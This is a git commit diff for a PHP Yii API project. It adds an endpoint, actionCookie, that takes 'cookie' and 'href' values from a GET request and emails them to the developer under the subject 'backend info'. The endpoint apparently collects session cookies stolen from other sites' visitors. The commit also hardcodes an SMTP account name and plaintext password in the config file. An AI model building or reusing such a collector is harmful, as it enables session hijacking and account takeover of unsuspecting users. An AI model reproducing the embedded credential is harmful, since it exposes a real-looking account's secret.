611e7584ae0c5ec4955616b56851e452af487ed5
EwingYangs <jiaying.yang@qq.com>
2018-09-20 21:24:42 +0800

    add cookie

--- gduf-api/config/web.php
+++ gduf-api/config/web.php
@@ -24,10 +24,14 @@ $config = [
         ],
         'mailer' => [
             'class' => 'yii\swiftmailer\Mailer',
-            // send all mails to a file by default. You have to set
-            // 'useFileTransport' to false and configure a transport
-            // for the mailer to send real emails.
-            'useFileTransport' => true,
+            'transport' => [
+                'class' => 'Swift_SmtpTransport',
+                'host' => 'smtp.163.com',
+                'username' => '13250150526@163.com',
+                'password' => 'kingandwade136',
+                'port' => '25',
+                'encryption' => 'tls',
+            ],
         ],
         'log' => [
             'traceLevel' => YII_DEBUG ? 3 : 0,
--- gduf-api/controllers/GetController.php
+++ gduf-api/controllers/GetController.php
@@ -1,13 +1,32 @@
 <?php
-
 namespace app\controllers;
-
 use Yii;
+use yii\rest\Controller;
+use app\models\Common;
+use app\models\State;
 
-class GetController
+class GetController extends Controller
 {
     // 获取cookie发短信
     public function actionCookie(){
-        echo 'die';die;
+
+        $cookie = Yii::$app->request->get('cookie');
+        $href = Yii::$app->request->get('href');
+
+        if(!$cookie || !$href){
+            Common::ajaxResult(State::$SYS_PERMISSION_ERROR_CODE , State::$SYS_PERMISSION_ERROR_MSG);
+        }
+
+        $cookie = urldecode($cookie);
+        $href = urldecode($href);
+
+        Yii::$app->mailer->compose()
+        ->setFrom('13250150526@163.com')
+        ->setTo('jiaying.yang@qq.com')
+        ->setSubject('后台信息')
+        ->setTextBody('cookie:'.$cookie.', href:'.$href)
+        ->setHtmlBody('<b>cookie为'.$cookie.', href为'.$href.'</b>')
+        ->send();
+
     }
 }
